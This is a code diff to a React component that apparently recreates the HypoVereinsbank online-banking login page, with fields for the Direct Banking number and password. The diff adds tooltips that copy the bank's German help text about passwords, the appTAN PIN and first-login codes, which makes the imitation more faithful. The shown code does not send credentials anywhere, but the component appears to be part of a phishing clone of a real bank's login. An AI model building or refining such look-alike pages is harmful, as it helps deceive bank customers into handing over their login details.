@@ -212,7 +212,14 @@ const Hypovereinsbank = () => {
 
                   <label className="block mb-4">
                     <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
-                      Direct Banking Nummer <Info size={13} style={{ color: TEAL }} />
+                      Direct Banking Nummer
+                      <InfoHint
+                        open={openHint === "user"}
+                        onToggle={() => setOpenHint(openHint === "user" ? null : "user")}
+                        onClose={() => setOpenHint(null)}
+                      >
+                        Ihre Direct Banking Nummer finden Sie in Ihren Anmeldeunterlagen.
+                      </InfoHint>
                     </span>
                     <input
                       type="text"
@@ -226,7 +233,19 @@ const Hypovereinsbank = () => {
 
                   <label className="block mb-5">
                     <span className="flex items-center gap-1.5 text-[14px] mb-1" style={{ color: DARK }}>
-                      Passwort <Info size={13} style={{ color: TEAL }} />
+                      Passwort
+                      <InfoHint
+                        open={openHint === "pw"}
+                        onToggle={() => setOpenHint(openHint === "pw" ? null : "pw")}
+                        onClose={() => setOpenHint(null)}
+                      >
+                        <p className="mb-2">
+                          Bitte prüfen Sie, ob Sie Ihr 6-10-stelliges Passwort verwendet haben und nicht versehentlich Ihre appTAN PIN (Zahlenkombination, nur für Transaktionsfreigaben).
+                        </p>
+                        <p>
+                          Sollten Sie sich erstmalig zum Online Banking anmelden, verwenden Sie bitte Ihren 5-stelligen Einstiegscode, welchen Sie bei der Registrierung erhalten haben.
+                        </p>
+                      </InfoHint>
                     </span>
                     <input
                       type="password"
